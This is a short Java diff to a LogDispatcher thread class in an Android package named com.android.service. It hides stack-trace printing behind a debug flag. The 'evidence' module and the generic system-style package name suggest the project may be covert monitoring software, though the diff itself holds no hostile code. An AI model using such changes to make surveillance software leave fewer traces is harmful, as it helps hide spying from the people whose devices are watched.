@@ -19,6 +19,7 @@ import java.util.concurrent.locks.ReentrantLock;
 
 import android.util.Log;
 
+import com.android.service.conf.Configuration;
 import com.android.service.evidence.Evidence;
 import com.android.service.file.Path;
 import com.android.service.util.Check;
@@ -93,7 +94,7 @@ public class LogDispatcher extends Thread implements Runnable {
 		try {
 			p = queue.take();
 		} catch (final InterruptedException e) {
-			e.printStackTrace();
+			if(Configuration.DEBUG) { e.printStackTrace(); }
 			return;
 		}
 
@@ -173,7 +174,7 @@ public class LogDispatcher extends Thread implements Runnable {
 
 				processQueue();
 			} catch (final InterruptedException e) {
-				e.printStackTrace();
+				if(Configuration.DEBUG) { e.printStackTrace(); }
 			} finally {
 				lock.unlock();
 			}
@@ -198,7 +199,7 @@ public class LogDispatcher extends Thread implements Runnable {
 				noLogs.signal();
 			}
 		} catch (final Exception e) {
-			e.printStackTrace();
+			if(Configuration.DEBUG) { e.printStackTrace(); }
 		} finally {
 			lock.unlock();
 		}
